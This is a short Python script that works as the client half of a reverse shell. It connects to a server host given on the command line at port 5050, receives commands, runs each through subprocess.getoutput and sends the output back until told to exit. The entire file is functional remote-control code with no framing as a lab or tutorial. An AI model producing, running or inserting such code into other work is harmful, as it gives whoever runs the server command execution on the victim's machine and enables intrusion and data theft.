import socket
import subprocess
import sys

SERVER_HOST = sys.argv[1]
SERVER_PORT = 5050
BUFFER_SIZE = 1024

# create socket object and connect
s = socket.socket()
s.connect((SERVER_HOST, SERVER_PORT))

# receive connection message
message = s.recv(BUFFER_SIZE).decode()
print("[SERVER]:", message)

while True:
    # receive command from server
    command = s.recv(BUFFER_SIZE).decode('utf-16')
    
    if command.lower() == "exit":
        break
    
    # execute command and retrieve results
    output = subprocess.getoutput(command)
    
    # send results back to server if any
    s.send(output.encode('utf-16'))
